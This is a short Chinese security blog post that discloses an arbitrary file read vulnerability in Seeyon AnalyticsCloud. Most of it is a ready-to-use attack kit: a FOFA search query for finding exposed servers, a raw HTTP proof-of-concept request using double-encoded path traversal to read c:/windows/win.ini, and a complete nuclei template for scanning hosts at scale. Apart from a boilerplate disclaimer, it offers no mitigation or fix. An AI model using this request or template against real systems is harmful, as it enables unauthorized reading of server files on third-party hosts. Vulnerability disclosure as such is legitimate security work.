#  致远AnalyticsCloud 分析云任意文件读取漏洞   
 HK安全小屋   2025-04-04 20:42  
  
## 免责声明  
  
       请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
FOFA:  
```
title="AnalyticsCloud 分析云"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/A8qcyicQXeI2P66Z2ia5bkjAxkcDmGicLJz4dibfRgYPKcsicz9PqcEdpicqWwA5uwppVyj1Yr87jvwIyxdMGGG1vFUw/640?wx_fmt=png&from=appmsg "")  
  
POC：  
```
GET /.%252e/.%252e/c:/windows/win.ini HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```  
  
响应内容为c:/windows/win.ini中的内容  
  
![](https://mmbiz.qpic.cn/mmbiz_png/A8qcyicQXeI2P66Z2ia5bkjAxkcDmGicLJzzerP3B8jgenE2ibibiblOgBEPTbkr1qiazYmkho7M8lkjuesx73dvKoprA/640?wx_fmt=png&from=appmsg "")  
  
nuclei POC:  
```
id: seeyon-analyticscloud-arbitrary-file-read

info:
  name: 致远 AnalyticsCloud 分析云任意文件读取漏洞
  author: xxx
  severity: high
  description: 致远 AnalyticsCloud 分析云存在任意文件读取漏洞，攻击者可通过特定路径读取服务器上的敏感文件。
  tags: file-read, seeyon

requests:
  - method: GET
    path:
      - "{{BaseURL}}/.%252e/.%252e/c:/windows/win.ini"
    headers:
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
      Accept-Encoding: "gzip, deflate"
      Accept: "*/*"
      Connection: "keep-alive"
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        part: body
        regex:
          - "for 16-bit app support"  
```  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
  
  
